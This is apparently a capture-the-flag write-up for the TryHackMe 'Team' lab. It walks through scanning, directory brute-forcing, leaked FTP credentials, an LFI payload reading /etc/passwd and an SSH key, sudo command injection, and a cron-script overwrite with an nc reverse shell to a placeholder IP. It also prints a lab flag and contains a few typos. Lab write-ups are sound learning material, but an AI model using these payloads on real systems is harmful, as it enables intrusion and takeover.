@@ -1,0 +1,195 @@
+Team - TryHackMe
+
+Scan the network
+nmap -sV -O 10.49.191.191
+sV: Service Version
+O: OS version
+
+Output:
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Lets enumerate all open ports one by one:
+1. 80 Apache httpd 2.4.41 
+
+Check http://10.49.191.191/robots.txt
+(Access denied)
+
+curl -s http://10.49.191.191 | head -30 
+(head only retrieves header content, not body)
+Read the code, most cases you wont find anything but do. In this case look at title:
+Apache2 Ubuntu Default Page: It works! If you see this add 'team.thm' to your hosts!
+
+The hints asks us to configure/add the virtual host "team.thm"
+Add the virtual host:
+echo "10.49.191.191 team.thm" | sudo tee -a /etc/hosts
+
+Lets try robots.txt now
+curl -s http://team.thm/robots.txt
+Output: dale
+(Probably a username)
+
+Continue the enumeration:
+gobuster dir -u http://team.thm -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
+
+We see multiple directories with respective codes:
+Status: 403
+Status: 301
+Status: 200
+
+301 and 200 are useful.
+Review all the scripts with those codes. 
+
+/assets : No access
+/robots.txt : Already reviewed
+/index.html : Nothing useful
+/scripts : Interesting folder
+
+gobuster dir -u http://team.thm/scripts/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50
+We see two files with 200 code:
+/script.txt
+
+Curl em out:
+curl -s http://team.thm/scripts/script.txt
+We see it says ftp username and password redacted, so no creds for us.
+However if you see the last line: 
+Note to self had to change the extension of the old "script" in this folder, as it has creds in
+
+As this is the new script which means there is an old script as well that has a different extention
+Run this command: Search for old extention
+gobuster dir -u http://team.thm/scripts/ -w /usr/share/wordlists/dirb/common.txt -x old -t 50
+
+We have a match:
+/script.old
+
+Lets review it:
+curl -s http://team.thm/scripts/script.old
+
+We find the creds:
+ftpuser:T3@m$h@r3
+
+Info received so far:
+1. dale
+2. ftpuser:T3@m$h@r3
+
+2. 21 vsftpd 3.0.5
+Lets login:
+
+ftp team.thm
+Cred: ftpuser:T3@m$h@r3
+
+Enumerate info:
+ls
+(In case if you get an error saying 229 Entering Extended passive Mode, just ctrl+c and type passive, enter and then ls again)
+
+ls -la
+cd workspace
+ls -la
+get New_site.txt
+exit
+
+Note: You must be wondering so smoothly i navigated into workshare, found the file and exited ftp. Real life doesn't work that way, since i know i was able to do it. I real life, explore all directories and download all files, irrespective of how unimportant they seem. Check EVERYTHING.
+
+ls 
+cat New_site.txt
+(We get some crucial info)
+
+1. Gyles (Another user)
+2. New website which can be found at .dev within the domain
+3. Copy of id_rsa file in relevant config file
+
+Lets fuzz; subdomain/virtual host brute forcing
+wfuzz -c --hw 977 -u http://team.thm -H "Host: FUZZ.team.thm" -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
+
+We see multiple subdomains:
+dev
+WWW
+www.dev
+
+The useful one is dev: Add it to virtual host
+
+echo "<TARGET IP ADDRESS> dev.team.thm" | sudo tee -a /etc/hosts
+Visit here: http://dev.team.thm/
+
+curl -s http://dev.team.thm
+(We see "Site is being built<a href=script.php?page=teamshare.php" in body)
+
+http://dev.team.thm/script.php?page=teamshare.php
+
+It loads a simple PHP page with a ?page= parameter, test for LFI:
+curl -s "http://dev.team.thm/script.php?page=../../../../../etc/passwd"
+(It displays a output, hence it is vulnerable to LFI)
+Note: In our case 5 ../ works, but always try from 3-10 in real world scenerios. 
+
+Now we can look for other interesting files.
+Look for SSH config. 
+
+curl -s "http://dev.team.htm/script.php?page=/etc/ssh/sshd_config"
+In the output we see Dale id_rsa (OpenSSH Private Key)
+Extract and clean the key
+
+curl -s "http://dev.team.htm/script.php?page=/etc/ssh/sshd_config" > ssh_key.txt
+nano ssh_key.txt
+Copy from Begin line to end line, paste in new file and remove all #.
+Save it in a new file dale_key.key
+
+ssh -i dale_key.key dale@team.thm
+
+You now have a shell:
+cat /home/dale/user.txt
+(We have a flag)
+THM{6Y0TXHz7c2d}
+
+Privilege Escalation time: 
+Remember we have Gyles? Lets get to him
+Check rights 
+sudo -l
+
+User dale may run the following commands on ip-10-49-131-164:
+    (gyles) NOPASSWD: /home/gyles/admin_checks
+    
+Inspect the script:
+cat /home/gyles/admin_checks
+
+The script has command injection vulnerability, it does read -p "..." error
+then executes $error without sanitization or quoting
+
+sudo -u gyles /home/gyles/admin_checks
+Enter name of person backing up the data: gagan
+Enter 'date' to timestamp the file: /bin/bash -i
+
+We now have a shell as gyles:
+whoami
+id
+groups
+
+(Lets try to do priv escalation to root from glyes)
+cat /etc/crontab
+ls -la /etc/cron*
+
+find / -nmae "*.sh" -writable 2>/dev/null | head -10
+(We see a file call /usr/local/bin/main_backup.sh)
+
+ls -la /usr/local/bin/main_backup.sh
+(-rwxrwxr-x 1 root admin 65 Jan 17  2021 /usr/local/bin/main_backup.sh)
+It is writable by admin group, gyles belongs to it
+
+Start a listener:
+nc -nlvp 4444
+
+Overwrite the script:
+cat > /usr/local/bin/main_backup.sh << 'EOF'
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <YOUR_IP_ADDRESS> 4444 >/tmp/f
+EOF
+
+Make it executable:
+chmod +x /usr/local/bin/main_backup.sh
+Wait for few minutes and you should receive a shell.
+
+We have root.
+whoami
+id
+cat /root/root.txt
